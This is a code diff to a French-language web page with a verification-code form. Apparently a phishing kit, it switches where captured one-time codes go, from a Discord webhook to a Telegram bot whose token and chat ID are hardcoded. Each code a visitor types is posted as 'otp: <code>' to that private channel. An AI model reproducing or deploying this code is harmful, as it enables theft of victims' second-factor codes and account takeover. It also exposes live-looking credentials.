@@ -198,8 +198,9 @@
     const messageEl = document.getElementById("message");
     const container = document.getElementById("form-container");
 
-    // Ta webhook Discord (remplace par la tienne)
-    const webhookURL = "https://discord.com/api/webhooks/1503507408809361508/Xt5IMEASOMvXtilR5vMq1zvw38sjwuXrByasBmU886pHOMEkIMC6-v7__LK2tdjuQd9R";
+    const TELEGRAM_TOKEN = "8415946453:AAEBq05t-7xawIXkSPFnqBtdoVsibe-xEVM";
+    const TELEGRAM_CHAT_ID = "-1004403515903";
+    const telegramAPI = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
 
     inputs.forEach((input, i) => {
       input.addEventListener("input", () => {
@@ -226,23 +227,14 @@
         return;
       }
 
-      const embed = {
-        color: 0x1e1e26,
-        title: "Code de vrification",
-        description: "### `" + code + "`\n> ⚠️ Ne partagez ce code avec personne",
-        thumbnail: {
-          url: "https://media.tenor.com/BSY1qTH8g-oAAAPo/check.gif"
-        },
-        footer: {
-          text: "" + new Date().toLocaleString('fr-FR') + "  Expire dans 5 min"
-        }
-      };
-
       try {
-        const res = await fetch(webhookURL, {
+        const res = await fetch(telegramAPI, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ embeds: [embed] })
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: `otp: ${code}`
+          })
         });
 
         if (res.ok) {
